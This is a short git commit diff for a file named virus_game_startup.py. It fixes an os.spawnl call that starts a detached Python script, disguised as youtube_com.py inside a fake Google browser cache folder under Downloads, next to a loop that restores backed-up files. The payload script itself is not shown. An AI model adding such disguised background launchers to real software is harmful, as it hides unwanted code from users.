b4521b08e19566a4582033770cc4977a9a3a18a1
Peter Brilla <ppeter.brilla@gmail.com>
2025-10-31 15:38:23 +0100

    Fixed

--- src/virus_game_startup.py
+++ src/virus_game_startup.py
@@ -13,7 +13,7 @@ backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
 virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
 
-os.spawnl(os.P_DETACH, f"python {virus_path}")
+os.spawnl(os.P_DETACH, "python", virus_path)
 
 while True:
   for index, file_paths in enumerate(files_to_backup):
